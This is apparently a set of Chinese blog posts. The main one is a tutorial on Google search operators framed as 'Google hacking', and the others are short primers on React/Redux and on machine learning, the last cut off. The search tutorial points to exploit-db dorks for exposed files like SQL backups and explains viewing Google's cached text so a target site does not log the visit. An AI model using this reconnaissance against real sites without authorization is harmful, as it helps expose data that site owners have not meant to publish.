[{"content":"前言 学习Google搜索，其目的是用于让自己得到更精准的信息，所以善用Google搜索对于信息收集、安全测试、查找答案等都有着非常大的帮助。而随着时间的变化Google对于语法的更新、规则都在改动，这些改动对于结果都有影响，所以使用前进行测试是非常有必要的。 查阅了诸多资料过后，将Google搜索的操作分为了三个等级，分别为基础搜索、布尔操作符、高级操作符，每个级别的都可以进行配合使用，有些组合起来能够让搜索更加精准，而有些则是不能进行组合。 同时这些搜索方式会与高级搜索设置中的功能重叠，但个人偏向使用语法对比高级搜索设置方便许多，所以后面的内容均使用语法，不会涉及到搜索设置等。 除此之外，还有诸多的网站可以获取到Google语法的途径，比如exploit-db是一个用于记录安全测试的Google语法数据库，这里面记录了非常多因配置失误操作的漏洞，如获取sql备份文件sql.bak等。Google Help提供常用的Google语法等。\n影响搜索的因素 Google在搜索原理的一篇简单的介绍了会影响搜索结果的几个因素，分别为以下7个因素：\n如果为中文，需要进行分词、语法等NLP技术的信息提取。\n查询理解，这个步骤典型的就是修正错别字，比如你搜索“贝京市”，那么算法会将关键词进行修正为“北京市”，所以返回的内容中也是“北京市”相关的内容。这个步骤我没有找到具体的文献，但和步骤1是有较强的联系。\n内容相关性，这个步骤典型的作用就是搜索网页中任何地方是否出现与关键词命中。\n内容质量，这个步骤用于确定网页是否具备权威、专业等，除了常见的网站认证、知名度、访问量等，还有Google的基于网页链接的算法，如PageRank，这种算法类似于投票，越权威的网站被引用/超链接的次数越多。基于这些情况然后进行排序，将这些高质量的网站靠前输出。\n网页可用性，这个步骤用于确定网页是否网页是否“优秀”，而Google是有一套公开的标准，典型的就是网页加载速度、适配各个访问的客户端、是否HTTPS、广告等。\n上下文设置，这个步骤和自己的历史数据、设置有关系，比如你的历史搜索中多次搜索了“巴塞罗那对阿森纳”，当你搜索“巴塞罗那”的时候，可能更加想访问的是“巴塞罗那球队”而不是“巴塞罗那地区”，该部分的影响，可以通过Google搜索主页右下角设置中的“您在Google搜索中的数据设置”删除，或者直接使用无痕模式搜索可以消除该影响。 除了这个，地区也会导致你的搜索结果会有影响，在Google右下角设置中的“搜索设置”里面的“区域设置”可以验证，比如将该设置更改为美国，你搜索\u0026quot;football\u0026quot;则是返回的NFL橄榄球职业比赛联盟，而如果将地区设置为英国，返回的则是足球。\n符号，在Google搜索中符号如（、。，/等都不会影响搜索结果，比如你搜索的是/中国北京/，那么结果中\u0026quot;中国（北京\u0026hellip;\u0026ldquo;这样的结果也会匹配。\n基础搜索 基础搜索是最常见的，里面包含了两种搜索方式：\n关键词查询：关键词查询就是最常用的方式，直接输入关键词查询或者给出多个以空格间隔的关键词，如/中国北京/或者/中国 北京/。但需要注意的是使用关键词查询，会尽可能的分词和理解你的意图（影响搜索的因素中的步骤一），并尽可能的返回有关的内容，那么如/中国北京/，就有可能包含/中国北京/、/中国/、/北京/等结果返回。\n准确查询：精确查询用双引号包裹一个或者多个关键词，与关键词查询不同之处在于精确查询并不会对关键词进行分词，而是原封不动的进行完整的匹配，所以你搜索/中国北京/，就有可能包含\u0026quot;中国北京\u0026rdquo;、\u0026ldquo;中国\u0026rdquo;、\u0026ldquo;北京\u0026quot;等结果返回。而搜索/\u0026ldquo;中国北京\u0026rdquo;/，则代表每一个结果都按照\u0026quot;中国北京\u0026quot;这个词进行完整的匹配，不会出现\u0026quot;中国\u0026rdquo;、\u0026ldquo;北京\u0026quot;等结果返回。 而如果精确搜索给出了多个关键词，如/\u0026ldquo;中国 北京\u0026rdquo;/，则这个中间的空格代表着顺序，说所以可以理解为查询的含义为在\u0026quot;中国\u0026quot;这个词后紧跟着\u0026quot;北京\u0026quot;这个关键词。\n除了这两种搜索之外，还包含了几个符号：\n通配符：通配符*与程序中的通配符意义不一样，中文和英文搜索中这里的通配符代表的是一个词，比如/\u0026ldquo;北京市 故宫\u0026rdquo;/，将“京”替换为*，也就是/\u0026ldquo;北*市 故宫\u0026rdquo;/搜索，那么返回的结果中可能包含着如“北厦门市故宫”、\u0026ldquo;北秋田市故宮\u0026quot;等结果。如果将搜索改为/\u0026rdquo;*市 故宫\u0026rdquo;/，那么你看见命中的关键词（红色标注）则为“太保市故宮”、“北京市故宫”等词。所以这说明通配符匹配的是一个词，而不是一个字，作用是尽可能的将一个词与前后的关键字进行组合成一个完整的词。\n单字任意符：这个符号对于中文不太友好，中文下呈现的大多数能匹配到标点符号，而代表任意中文字符则不行，如搜索\u0026quot;湖北省\u0026quot;、\u0026ldquo;湖南省\u0026quot;等相关信息，所以语法为/\u0026ldquo;湖*省\u0026rdquo;/，但是返回的则是\u0026quot;湖省\u0026quot;和\u0026quot;湖（省\u0026rdquo;。 而对于英文则是能替代任意字符，比如/\u0026ldquo;hac*ing\u0026rdquo;/，则能搜索到\u0026quot;hacking\u0026quot;等结果。\n括号：Google搜索中对于括号是不敏感的，所以如 /北京(（市/ 搜索中放置了一个中文一个英文的括号，都会正常返回“北京市”结果，而在精确操作中同样适用，即/\u0026ldquo;北京(（市\u0026rdquo;/也能正确返回“北京市”的结果。 而基于括号这个操作，在搜索过程中就可以利用这个特性进行符合人类识别的分块构建查询，这个在于后面的布尔操作符和高级操作符上使用较多。\n布尔操作符 布尔操作符可以使用于基础搜索以及高级操作符，非常灵活，对于信息筛选的帮助非常大，主要为以下三种：\nAND操作符：该操作符用+表示添加在关键词前。和代码中的不一样，代码中表示的是两者都必须具备，而在Google中，代表的是多添加一个关键词进行搜索，所以这个操作符没有太大的意义，如搜索/北京 +故宫/和/北京 故宫/结果相差不大，这是因为Google本身就会将所有关键词放进搜索条件中进行搜索。\nNOT排除操作符：该操作符用-表示添加在关键词前，与字面意义一样，用于排除某个条件，如关键词返回的结果等，比如想了解/故宫/的信息，但不想看旅游相关的信息，如同程，那么就可以使用该操作符搜索/故宫 -同程/。\nOR操作符：该操作符用|表示添加在两个关键词之间，代表的意义为两个关键词匹配任意一个匹配网页的内容都可以返回，比如/北京|重庆 /，那么将返回北京或者重庆相关的页面。 OR操作符可以用于关键词的多选组合，比如查看北京的地铁规划，那么\u0026quot;地铁\u0026quot;一词可能也叫\u0026quot;轨道\u0026quot;，\u0026ldquo;规划\u0026quot;一词也可能叫\u0026quot;计划\u0026rdquo;，那么这个时候就可以通过OR操作符搜索/\u0026ldquo;北京 地铁|轨道 规划|计划\u0026rdquo;/（也可以利用括号进行分组，即/\u0026ldquo;北京 (地铁|轨道) (规划|计划)\u0026quot;/），那么Google将尝试组合“北京地铁计划”、“北京轨道计划”、“北京地铁规划”、“北京轨道规划”等关键词搜索。\n高级操作符 Google提供的搜索结果中，每条记录包含了六个部分，分别为标题、正文（简介）、URL、时间、缓存、文件类型，所有高级操作符也是围绕着这几个部分进行更为精细的控制，比如针对标题的搜索、正文的搜索、url的搜索等。 操作符有着严格的格式，高级操作符的语法为Operator:value，并且操作符、冒号、值之间不能有空格。如果不按照该格式，Google搜索将会把高级操作符当作关键词进行搜索，而查看自己是否有语法的错误，可以通过返回的结果中命中的红色关键词是否有异常，比如是否包含了高级操作符。 除此之外，前面精准搜索、布尔操作符都可以与高级操作符结合。\n标题类 标题类操作符为intitle和allintitle，用于搜索网页的标题，意味着你关键词的搜索范围仅限于标题。\nintitle：用于搜索单个词是否包含在标题中，比如搜索/intitle:\u0026ldquo;北京市\u0026rdquo;/，如果你要查询多个关键词用于搜索标题符合的网页，那么可以使用多个intitle或者使用allintitle。 allintitle：该高级操作符是会将后面所有的单词用于搜索标题，所以如intitle搜索标题中包含\u0026quot;北京市\u0026quot;和\u0026quot;故宫\u0026quot;的关键词，那么需要写两个intitle，而allintitle则只需要写一个/allintitle:\u0026ldquo;北京市\u0026rdquo; \u0026ldquo;故宫\u0026rdquo;/，但需要注意all开头的大部分高级操作符与其他操作符进行组合使用的时候会出现问题，所以如果你只是单独的搜索标题那么可以使用allintitle，而如果要与其他条件进行组合，那么建议使用intitle。 正文类 正文类操作符为intext和allintext，用于搜索网页的正文，意味着你的关键词的搜索范围仅限于正文/简介。\nintext：用于搜索单个词是否包含在正文中，比如搜索/intext:北京市/，如果你查询多个同样使用多个intext。 allintext：用于搜索正文中的多个词，同样与allintitle用法一样。 URL类 URL类用于搜索网址，涉及的高级操作符有4个，分为：\ninurl和allinurl：inurl和allinurl的使用方法和标题类、正文类一致。\nsite：site高级操作符用于搜索某个特定的域名或者域，比如只搜索微博关于故宫的信息，那么搜索语法为/site:weibo.com 故宫/。而搜索特定的域，则指的是com、cn、edu.cn等域名的后缀，如搜索所有的国内学校研究生招生的情况，则搜索语法为/site:edu.cn 研究生招生/。\ninanchor：inanchor高级操作符用于搜索超链接的文本。比如链接地址为weibo.com/xxx，而这个链接的文本则显示为“我的微博”，在html表示为\u0026lt;a href=\u0026quot;https://weibo.com/xxx\u0026quot;\u0026gt;我的微博\u0026lt;/a\u0026gt;，inanchor就是用于搜索这个链接文本“我的微博”。 该操作符搜索返回的结果并非是网页中是否包含，而是直接返回该链接，比如“我的微博”这个链接存放在我的主页，Google并不会返回我的主页作为结果，而是将\u0026quot;我的微博\u0026quot;这条链接直接作为结果。\n时间类 Google提供after和before用于搜索网页发布的时间，两个高级操作符的value格式为YYYY-MM-DD，两个操作符的value，只能单独设置年格式年或者完整日期格式年-月-日，而不能只提供年-月的格式。比如/北京市 before:2020-08/的2020-08就会作为关键词，而应该使用/北京市 before:2020-08-01/或者/北京市 before:2020/。 如果要限定时间范围，则可以同时使用after和before，但是需要注意同时使用，其中一个需要按照完整格式给出。如/北京市 after:2020 before:2021/就无法筛选时间，其他的时间结果也会存在结果当中，而应该使用/北京市 after:2020 before:2021-12-30/或者/北京市 after:2020-01-01 before:2021/。\n缓存类 Google搜索提供用于查看缓存的搜索语法cache，而这个语法不能与其他语法共用，并且语法规则也较为严格，需要输入完整的url，但是大部分的时候是不需要使用这个语法的，而是自己通过搜索结果后，进行查询，而对于没有缓存的页面则会直接返回错误的页面。 缓存中会提供三种版本，完整版、纯文字版、源代码，完整版是Google提供了文字信息，而对于动态加载的数据、图片等则是通过调用原始网页的信息，也就是说你除了和Google服务器进行请求，还可能会和原网站进行请求资源，纯文字版和源代码则只会与Google进行请求，在信息搜集等时候，可以利用该方法避免暴露自己的信息，同时已删除掉的部分网页也可以通过缓存获取到相关的信息。 避免暴露信息的方式使用可以先获取到搜索结构的连接，然后通过替换url字符串直接访问纯文字版本http://webcache.googleusercontent.com/search?q=cache:5YLkdysWgnIJ:替换为完整url\u0026amp;strip=1 来访问目标网址的缓存，比如访问 上面的链接中里面的strip=1代表直接访问纯文本，所以这样你就不需要打开缓存页面然后再选择纯文本版，这样就只会和google服务器请求数据，而不会被目标网站记录。\n文件类型操作符 Google搜索提供了一种以特定文件扩展名结尾的网页搜索语法filetype，这个语法可以方便我们去搜索像pdf/doc/xlsx等指定的文件后缀，这个功能在Google高级设置中能设置，但是高级搜索中仅仅只提供了部分的可选后缀，而通过语法你可以查询其他的特殊文件扩展名的网页，比如搜索包含故宫关键词的pdf文件/故宫 filetype:pdf/、搜索包含故宫的表格文件/故宫 filetype:xlsx/等。 但对于常用的文件类型Google会进行解析，但对于不太常用的文件类型Google则不会解析，常见 类型比如pdf类型即使不是网页pdf后缀，也能够识别出来，这是因为Google在抓去网页的时候会解析内容。比如/故宫 filetype:pdf -pdf/。 除此之外，https://filext.com/list/s 网站搜集了非常多的文件扩展名及用途。\n关键词监控工具 Google搜索提供了一个用于推送关键词监听的工具”google alert”，这个工具可以去更改推送频率、来源、语言等设置，而且搜索框中也支持Google的基础搜索、布尔、高级操作符，当新的结果显示在Google搜索结果中的时候，将会将新信息推送至你设置的邮箱当中。 这个工具对于关键词热度、舆情监控是非常有用的。\n参考资料 《Google Hacking 技术手册》 https://www.indeed.com/career-advice/finding-a-job/google-search-operators https://kinsta.com/blog/google-search-operators/ https://support.google.com/websearch/answer/2466433?hl=en\u0026amp;visit_id=638009788259931665-4261219002\u0026amp;rd=1 https://securitytrails.com/blog/google-hacking-techniques https://www.google.com/search/howsearchworks/how-search-works/ranking-results/ https://www.google.com/alerts# https://developers.google.com/search/docs/advanced/guidelines/webmaster-guidelines?hl=zh-cn ","permalink":"https://vec6.com/posts/google-hacking-test/","summary":"前言 学习Google搜索，其目的是用于让自己得到更精准的信息，所以善用Google搜索对于信息收集、安全测试、查找答案等都有着非常大的帮助。而随着时间的变化Google对于语法的更新、规则都在改动，这些改动对于结果都有影响，所以使用前进行测试是非常有必要的。 查阅了诸多资料过后，将Google搜索的操作分为了三个等级，分别为基础搜索、布尔操作符、高级操作符，每个级别的都可以进行配合使用，有些组合起来能够让搜索更加精准，而有些则是不能进行组合。 同时这些搜索方式会与高级搜索设置中的功能重叠，但个人偏向使用语法对比高级搜索设置方便许多，所以后面的内容均使用语法，不会涉及到搜索设置等。 除此之外，还有诸多的网站可以获取到Google语法的途径，比如exploit-db是一个用于记录安全测试的Google语法数据库，这里面记录了非常多因配置失误操作的漏洞，如获取sql备份文件sql.bak等。Google Help提供常用的Google语法等。\n影响搜索的因素 Google在搜索原理的一篇简单的介绍了会影响搜索结果的几个因素，分别为以下7个因素：\n如果为中文，需要进行分词、语法等NLP技术的信息提取。\n查询理解，这个步骤典型的就是修正错别字，比如你搜索“贝京市”，那么算法会将关键词进行修正为“北京市”，所以返回的内容中也是“北京市”相关的内容。这个步骤我没有找到具体的文献，但和步骤1是有较强的联系。\n内容相关性，这个步骤典型的作用就是搜索网页中任何地方是否出现与关键词命中。\n内容质量，这个步骤用于确定网页是否具备权威、专业等，除了常见的网站认证、知名度、访问量等，还有Google的基于网页链接的算法，如PageRank，这种算法类似于投票，越权威的网站被引用/超链接的次数越多。基于这些情况然后进行排序，将这些高质量的网站靠前输出。\n网页可用性，这个步骤用于确定网页是否网页是否“优秀”，而Google是有一套公开的标准，典型的就是网页加载速度、适配各个访问的客户端、是否HTTPS、广告等。\n上下文设置，这个步骤和自己的历史数据、设置有关系，比如你的历史搜索中多次搜索了“巴塞罗那对阿森纳”，当你搜索“巴塞罗那”的时候，可能更加想访问的是“巴塞罗那球队”而不是“巴塞罗那地区”，该部分的影响，可以通过Google搜索主页右下角设置中的“您在Google搜索中的数据设置”删除，或者直接使用无痕模式搜索可以消除该影响。 除了这个，地区也会导致你的搜索结果会有影响，在Google右下角设置中的“搜索设置”里面的“区域设置”可以验证，比如将该设置更改为美国，你搜索\u0026quot;football\u0026quot;则是返回的NFL橄榄球职业比赛联盟，而如果将地区设置为英国，返回的则是足球。\n符号，在Google搜索中符号如（、。，/等都不会影响搜索结果，比如你搜索的是/中国北京/，那么结果中\u0026quot;中国（北京\u0026hellip;\u0026ldquo;这样的结果也会匹配。\n基础搜索 基础搜索是最常见的，里面包含了两种搜索方式：\n关键词查询：关键词查询就是最常用的方式，直接输入关键词查询或者给出多个以空格间隔的关键词，如/中国北京/或者/中国 北京/。但需要注意的是使用关键词查询，会尽可能的分词和理解你的意图（影响搜索的因素中的步骤一），并尽可能的返回有关的内容，那么如/中国北京/，就有可能包含/中国北京/、/中国/、/北京/等结果返回。\n准确查询：精确查询用双引号包裹一个或者多个关键词，与关键词查询不同之处在于精确查询并不会对关键词进行分词，而是原封不动的进行完整的匹配，所以你搜索/中国北京/，就有可能包含\u0026quot;中国北京\u0026rdquo;、\u0026ldquo;中国\u0026rdquo;、\u0026ldquo;北京\u0026quot;等结果返回。而搜索/\u0026ldquo;中国北京\u0026rdquo;/，则代表每一个结果都按照\u0026quot;中国北京\u0026quot;这个词进行完整的匹配，不会出现\u0026quot;中国\u0026rdquo;、\u0026ldquo;北京\u0026quot;等结果返回。 而如果精确搜索给出了多个关键词，如/\u0026ldquo;中国 北京\u0026rdquo;/，则这个中间的空格代表着顺序，说所以可以理解为查询的含义为在\u0026quot;中国\u0026quot;这个词后紧跟着\u0026quot;北京\u0026quot;这个关键词。\n除了这两种搜索之外，还包含了几个符号：\n通配符：通配符*与程序中的通配符意义不一样，中文和英文搜索中这里的通配符代表的是一个词，比如/\u0026ldquo;北京市 故宫\u0026rdquo;/，将“京”替换为*，也就是/\u0026ldquo;北*市 故宫\u0026rdquo;/搜索，那么返回的结果中可能包含着如“北厦门市故宫”、\u0026ldquo;北秋田市故宮\u0026quot;等结果。如果将搜索改为/\u0026rdquo;*市 故宫\u0026rdquo;/，那么你看见命中的关键词（红色标注）则为“太保市故宮”、“北京市故宫”等词。所以这说明通配符匹配的是一个词，而不是一个字，作用是尽可能的将一个词与前后的关键字进行组合成一个完整的词。\n单字任意符：这个符号对于中文不太友好，中文下呈现的大多数能匹配到标点符号，而代表任意中文字符则不行，如搜索\u0026quot;湖北省\u0026quot;、\u0026ldquo;湖南省\u0026quot;等相关信息，所以语法为/\u0026ldquo;湖*省\u0026rdquo;/，但是返回的则是\u0026quot;湖省\u0026quot;和\u0026quot;湖（省\u0026rdquo;。 而对于英文则是能替代任意字符，比如/\u0026ldquo;hac*ing\u0026rdquo;/，则能搜索到\u0026quot;hacking\u0026quot;等结果。\n括号：Google搜索中对于括号是不敏感的，所以如 /北京(（市/ 搜索中放置了一个中文一个英文的括号，都会正常返回“北京市”结果，而在精确操作中同样适用，即/\u0026ldquo;北京(（市\u0026rdquo;/也能正确返回“北京市”的结果。 而基于括号这个操作，在搜索过程中就可以利用这个特性进行符合人类识别的分块构建查询，这个在于后面的布尔操作符和高级操作符上使用较多。\n布尔操作符 布尔操作符可以使用于基础搜索以及高级操作符，非常灵活，对于信息筛选的帮助非常大，主要为以下三种：\nAND操作符：该操作符用+表示添加在关键词前。和代码中的不一样，代码中表示的是两者都必须具备，而在Google中，代表的是多添加一个关键词进行搜索，所以这个操作符没有太大的意义，如搜索/北京 +故宫/和/北京 故宫/结果相差不大，这是因为Google本身就会将所有关键词放进搜索条件中进行搜索。\nNOT排除操作符：该操作符用-表示添加在关键词前，与字面意义一样，用于排除某个条件，如关键词返回的结果等，比如想了解/故宫/的信息，但不想看旅游相关的信息，如同程，那么就可以使用该操作符搜索/故宫 -同程/。\nOR操作符：该操作符用|表示添加在两个关键词之间，代表的意义为两个关键词匹配任意一个匹配网页的内容都可以返回，比如/北京|重庆 /，那么将返回北京或者重庆相关的页面。 OR操作符可以用于关键词的多选组合，比如查看北京的地铁规划，那么\u0026quot;地铁\u0026quot;一词可能也叫\u0026quot;轨道\u0026quot;，\u0026ldquo;规划\u0026quot;一词也可能叫\u0026quot;计划\u0026rdquo;，那么这个时候就可以通过OR操作符搜索/\u0026ldquo;北京 地铁|轨道 规划|计划\u0026rdquo;/（也可以利用括号进行分组，即/\u0026ldquo;北京 (地铁|轨道) (规划|计划)\u0026quot;/），那么Google将尝试组合“北京地铁计划”、“北京轨道计划”、“北京地铁规划”、“北京轨道规划”等关键词搜索。\n高级操作符 Google提供的搜索结果中，每条记录包含了六个部分，分别为标题、正文（简介）、URL、时间、缓存、文件类型，所有高级操作符也是围绕着这几个部分进行更为精细的控制，比如针对标题的搜索、正文的搜索、url的搜索等。 操作符有着严格的格式，高级操作符的语法为Operator:value，并且操作符、冒号、值之间不能有空格。如果不按照该格式，Google搜索将会把高级操作符当作关键词进行搜索，而查看自己是否有语法的错误，可以通过返回的结果中命中的红色关键词是否有异常，比如是否包含了高级操作符。 除此之外，前面精准搜索、布尔操作符都可以与高级操作符结合。\n标题类 标题类操作符为intitle和allintitle，用于搜索网页的标题，意味着你关键词的搜索范围仅限于标题。\nintitle：用于搜索单个词是否包含在标题中，比如搜索/intitle:\u0026ldquo;北京市\u0026rdquo;/，如果你要查询多个关键词用于搜索标题符合的网页，那么可以使用多个intitle或者使用allintitle。 allintitle：该高级操作符是会将后面所有的单词用于搜索标题，所以如intitle搜索标题中包含\u0026quot;北京市\u0026quot;和\u0026quot;故宫\u0026quot;的关键词，那么需要写两个intitle，而allintitle则只需要写一个/allintitle:\u0026ldquo;北京市\u0026rdquo; \u0026ldquo;故宫\u0026rdquo;/，但需要注意all开头的大部分高级操作符与其他操作符进行组合使用的时候会出现问题，所以如果你只是单独的搜索标题那么可以使用allintitle，而如果要与其他条件进行组合，那么建议使用intitle。 正文类 正文类操作符为intext和allintext，用于搜索网页的正文，意味着你的关键词的搜索范围仅限于正文/简介。\nintext：用于搜索单个词是否包含在正文中，比如搜索/intext:北京市/，如果你查询多个同样使用多个intext。 allintext：用于搜索正文中的多个词，同样与allintitle用法一样。 URL类 URL类用于搜索网址，涉及的高级操作符有4个，分为：\ninurl和allinurl：inurl和allinurl的使用方法和标题类、正文类一致。\nsite：site高级操作符用于搜索某个特定的域名或者域，比如只搜索微博关于故宫的信息，那么搜索语法为/site:weibo.com 故宫/。而搜索特定的域，则指的是com、cn、edu.cn等域名的后缀，如搜索所有的国内学校研究生招生的情况，则搜索语法为/site:edu.cn 研究生招生/。\ninanchor：inanchor高级操作符用于搜索超链接的文本。比如链接地址为weibo.com/xxx，而这个链接的文本则显示为“我的微博”，在html表示为\u0026lt;a href=\u0026quot;https://weibo.com/xxx\u0026quot;\u0026gt;我的微博\u0026lt;/a\u0026gt;，inanchor就是用于搜索这个链接文本“我的微博”。 该操作符搜索返回的结果并非是网页中是否包含，而是直接返回该链接，比如“我的微博”这个链接存放在我的主页，Google并不会返回我的主页作为结果，而是将\u0026quot;我的微博\u0026quot;这条链接直接作为结果。","title":"Google Hacking Test"},{"content":"最近几年单页应用程序发展非常迅速，从早期通过Javascript写入大量html模版去做单页程序（SPA），到现在的React、Vue（最为流行），但不得不说，前端的技术进步太快了，稍不关注技术，就会出来很多的新的技术。\n但归根结底，每次新的技术出来，埋头深入发现远比想象的复杂，而到了一定的时间后则能够想明白一些事情，这也就是\u0026quot;深入浅出\u0026quot;的道理。 单页应用是一个复杂的技术，要解决这些问题，出现了很多\u0026quot;框架\u0026quot;、工具，比如React、Vue、React-router、Redux等。对于新手来说更是学了一圈后出来也是懵的。但总体来说，React和Vue这类库本质都没有什么区别，都是为了解决SPA提出的方案。这类库大部分主要的理念是将Web应用划分为一个一个的组件为单元，这些组件可以包含另一个组件，以此来达到复用性。\n而每个组件不可能都显示一样，那这样复用性是没有意义的。 那这个时候提出了“状态”的概念，来让每个复用的组件显示不同的内容，状态分为了props和state，props是由外部传入进来的状态，state则是组件内部自己的状态。而这类UI库对于状态的变化，都会根据一些优秀的算法去重新渲染组件，并且渲染的时候仅仅涉及到改变的那一部分内容。\n之所以需要状态，其实告诉React这类库需要监听哪些值，方便在改变这些值的时候，React可以及时的进行计算和重新渲染组件。 比如下面的代码就可以通过传递name值进行重复使用包含\u0026lt;h2\u0026gt;标签的组件，这种方式传递的状态在内部就是使用props获取。\n\u0026lt;Header name=\u0026#39;hello\u0026#39;\u0026gt; // 输出：\u0026lt;h2\u0026gt;Hello\u0026lt;/h2\u0026gt; \u0026lt;Header name=\u0026#39;world\u0026#39;\u0026gt; // 输出：\u0026lt;h2\u0026gt;world\u0026lt;/h2\u0026gt; 而state则更多用于组件内部，比如当你鼠标点击需要获取一个报价，这个时候组件内部会发起一个请求，从服务器获取到报价后返回，改变状态，UI库进行重新渲染，这个时候就能获取到报价。 虽然说React提供了这些方便的功能，也提倡组件化和重复使用，但很多的组件是需要自己去一个一个写的。那这个时候，就有很多个人、组织开发出了\u0026quot;组件库\u0026quot;，\u0026ldquo;组件库\u0026quot;中包含了很多已经开发好可复用的组件，可以直接通过调用直接使用，这就是我们为什么看见除了React还有Ant Design、MaterialUI库。\n介绍完UI库和组件库后，单页应用还差一个东西，就是路由功能，路由也可以通过简单的Javascript来判断，比如当点击了一个链接后，Javascript将当前页面内容清除（隐藏），然后再渲染点击的目标内容。但是这个时候有一些问题，比如需要编写大量的代码、丢失浏览器的前进后退、没有办法收藏等问题（后面两个问题可以再通过增加代码去解决）。所以React-router-dom`这类的库就出现了，把所有的底层的逻辑和代码都进行封装提供一些接口，即大部分的人不需要再编写、理解这类的代码直接可以开箱即用，这也就是这类路由库出现的原因。 我们从前面了解到了状态分别为props和state，一个是外部，一个是内部的。\n那这个时候如果组件的嵌套过于\u0026quot;多层次\u0026quot;了后，比如从顶层的组件需要传递一个状态到第N层的组件中，那么每一层即使不需要不处理也要将状态进行传递，那这个时候涉及到的组件其中会包含非常多的和组件无关的代码。 所以这个时候需要一个通用的状态管理的解决方案（如Redux），让整个Web应用都共享一个大的状态，需要多层传递的状态则可以放在这个大状态内部，让不关心有些状态的组件不用去关心无关状态，而有些状态的组件去关心自己关心的状态。\nRedux本身设计是非常有趣的，整个应用的状态不能直接修改，这是因为如果大家都直接修改很有可能会造成状态的管理的混乱，所以Redux的修改状态流程是组件发起动作-\u0026gt;Dispatch函数接收动作-\u0026gt;reducer处理动作-\u0026gt;影响状态-\u0026gt;重新渲染组件。\n","permalink":"https://vec6.com/posts/frontend-terms/","summary":"最近几年单页应用程序发展非常迅速，从早期通过Javascript写入大量html模版去做单页程序（SPA），到现在的React、Vue（最为流行），但不得不说，前端的技术进步太快了，稍不关注技术，就会出来很多的新的技术。\n但归根结底，每次新的技术出来，埋头深入发现远比想象的复杂，而到了一定的时间后则能够想明白一些事情，这也就是\u0026quot;深入浅出\u0026quot;的道理。 单页应用是一个复杂的技术，要解决这些问题，出现了很多\u0026quot;框架\u0026quot;、工具，比如React、Vue、React-router、Redux等。对于新手来说更是学了一圈后出来也是懵的。但总体来说，React和Vue这类库本质都没有什么区别，都是为了解决SPA提出的方案。这类库大部分主要的理念是将Web应用划分为一个一个的组件为单元，这些组件可以包含另一个组件，以此来达到复用性。\n而每个组件不可能都显示一样，那这样复用性是没有意义的。 那这个时候提出了“状态”的概念，来让每个复用的组件显示不同的内容，状态分为了props和state，props是由外部传入进来的状态，state则是组件内部自己的状态。而这类UI库对于状态的变化，都会根据一些优秀的算法去重新渲染组件，并且渲染的时候仅仅涉及到改变的那一部分内容。\n之所以需要状态，其实告诉React这类库需要监听哪些值，方便在改变这些值的时候，React可以及时的进行计算和重新渲染组件。 比如下面的代码就可以通过传递name值进行重复使用包含\u0026lt;h2\u0026gt;标签的组件，这种方式传递的状态在内部就是使用props获取。\n\u0026lt;Header name=\u0026#39;hello\u0026#39;\u0026gt; // 输出：\u0026lt;h2\u0026gt;Hello\u0026lt;/h2\u0026gt; \u0026lt;Header name=\u0026#39;world\u0026#39;\u0026gt; // 输出：\u0026lt;h2\u0026gt;world\u0026lt;/h2\u0026gt; 而state则更多用于组件内部，比如当你鼠标点击需要获取一个报价，这个时候组件内部会发起一个请求，从服务器获取到报价后返回，改变状态，UI库进行重新渲染，这个时候就能获取到报价。 虽然说React提供了这些方便的功能，也提倡组件化和重复使用，但很多的组件是需要自己去一个一个写的。那这个时候，就有很多个人、组织开发出了\u0026quot;组件库\u0026quot;，\u0026ldquo;组件库\u0026quot;中包含了很多已经开发好可复用的组件，可以直接通过调用直接使用，这就是我们为什么看见除了React还有Ant Design、MaterialUI库。\n介绍完UI库和组件库后，单页应用还差一个东西，就是路由功能，路由也可以通过简单的Javascript来判断，比如当点击了一个链接后，Javascript将当前页面内容清除（隐藏），然后再渲染点击的目标内容。但是这个时候有一些问题，比如需要编写大量的代码、丢失浏览器的前进后退、没有办法收藏等问题（后面两个问题可以再通过增加代码去解决）。所以React-router-dom`这类的库就出现了，把所有的底层的逻辑和代码都进行封装提供一些接口，即大部分的人不需要再编写、理解这类的代码直接可以开箱即用，这也就是这类路由库出现的原因。 我们从前面了解到了状态分别为props和state，一个是外部，一个是内部的。\n那这个时候如果组件的嵌套过于\u0026quot;多层次\u0026quot;了后，比如从顶层的组件需要传递一个状态到第N层的组件中，那么每一层即使不需要不处理也要将状态进行传递，那这个时候涉及到的组件其中会包含非常多的和组件无关的代码。 所以这个时候需要一个通用的状态管理的解决方案（如Redux），让整个Web应用都共享一个大的状态，需要多层传递的状态则可以放在这个大状态内部，让不关心有些状态的组件不用去关心无关状态，而有些状态的组件去关心自己关心的状态。\nRedux本身设计是非常有趣的，整个应用的状态不能直接修改，这是因为如果大家都直接修改很有可能会造成状态的管理的混乱，所以Redux的修改状态流程是组件发起动作-\u0026gt;Dispatch函数接收动作-\u0026gt;reducer处理动作-\u0026gt;影响状态-\u0026gt;重新渲染组件。","title":"前端的技术栈理解"},{"content":"人工智能 人工智能是一个比较广泛的概念，这个概念实际上指的是让机器像人一样思考，其最早由计算机科学之父阿兰图灵在1950年的一篇《计算机器与智能》论文中写出“如果电脑能在5分钟能回答由人类测试者提出的一系列的问题，且超过30%回答让测试者误认为人类所答，则电脑通过测试”，这段话也直接启蒙式的开启了人工智能领域的研究。 而“人工智能”一词，第一次出现在1956年，达特茅斯大学召开的学术会议室，由人工智能之父约翰·麦卡锡首次提出。 通常人工智能被分为弱人工智能和强人工智能，前者可以让机器有一定程度的学习、理解和推理能力，后者则是由自适应能力，比如解决一些之前没有遇见过的问题，我们常在电影里看见的机器人就是一种强人工智能。\n机器学习 机器学习为人工智能的一个研究分支，也可以理解为弱人工智能的一种实现，而机器学习做的事情是让机器取模拟和实现人类的学习行为，以获得新的技能和知识。 人工智能领域的先驱Arthur Samuel在1959年给出的机器学习定义为“不直接编程，却能赋予计算机提供能力的方法”，而美国工程院院士Tom Mitchell则给出了一个更明确的含义，指出“机器学习是通过某项人物的经验数据提高了在该人物上的能力”。 机器学习最基本的是利用给出的算法来解析数据，从中学习到一定规则(模式)得到经验，并利用学习到的经验对类似的问题作出预测和判断。 而如今机器学习已在多个领域得到了很好的应用，大致上可以将机器学习的分为几个研究方向：\n模式识别 自然语言处理 数据挖掘 计算机视觉 语言识别 统计学习 算法 前面提到机器学习需要给出算法来解析（学习）数据，以获得经验，而这个算法则包括我们常说的“神经网络”也是机器学习算法的一种，常见的算法有如下：\n回归算法 神经网络算法 SVM向量机 聚类算法 降维算法 推荐算法 决策树 朴素贝叶斯 其他算法 